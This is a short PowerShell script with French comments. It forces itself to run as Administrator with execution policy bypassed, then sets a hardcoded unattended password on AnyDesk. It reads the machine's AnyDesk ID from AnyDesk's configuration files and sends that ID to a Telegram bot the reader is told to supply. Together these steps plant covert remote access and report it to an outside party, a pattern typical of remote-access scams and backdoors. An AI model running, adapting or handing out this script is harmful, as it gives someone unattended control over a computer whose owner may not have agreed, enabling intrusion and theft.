# Vérifie si PowerShell est exécuté en mode Administrateur, sinon relance en mode Admin question de s'assurer comment nous ayons pas un message d'erreur et ensuiote laler l'luvrir manuellemtn
$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($CurrentUser)
$AdminRole = [Security.Principal.WindowsBuiltInRole]::Administrator

if (-not $Principal.IsInRole($AdminRole)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}


cmd.exe /c "echo qc69t4B#Z0kE3 | C:\ProgramData\AnyDesk\AnyDesk.exe --set-password"

function Get-AnyDeskID {
    param (
        [string]$filePath,
        [string]$pattern
    )
    
    if (Test-Path $filePath) {
        $match = Select-String -Path $filePath -Pattern $pattern | ForEach-Object {
            if ($_.Line -match "(\d{9,10})") {
                $matches[1]
            }
        }
        return $match
    }
    return $null
}

$anydeskID = Get-AnyDeskID -filePath "C:\ProgramData\AnyDesk\system.conf" -pattern "ad.anynet.id"
if (-not $anydeskID) {
    $anydeskID = Get-AnyDeskID -filePath "C:\ProgramData\AnyDesk\ad_svc.trace" -pattern "Client-ID"
}

function Send-TelegramMessage {
    param ([string]$message)
    
    $BotToken = "xxxxxxxxxxxxxxxxxxxxxx"# A remplacer pour mon cas c'est telegram tu pexu choisir le tien 
    $ChatID   = "xxxxxxx" # pareil ici aussi 

    $url = "https://api.telegram.org/bot$BotToken/sendMessage"
    $parameters = @{
        "chat_id" = $ChatID
        "text"    = $message
    }
    Invoke-RestMethod -Uri $url -Method Post -Body $parameters
}

if ($anydeskID) {
    $message = "ID AnyDesk trouvé : $anydeskID"
    Write-Output $message
    Send-TelegramMessage -message $message
} else {
    $message = "Impossible de récupérer l'ID AnyDesk."
    Write-Output $message
    Send-TelegramMessage -message $message
}

Write-Host "Script terminé. Appuyez sur une touche pour fermer..."
Read-Host
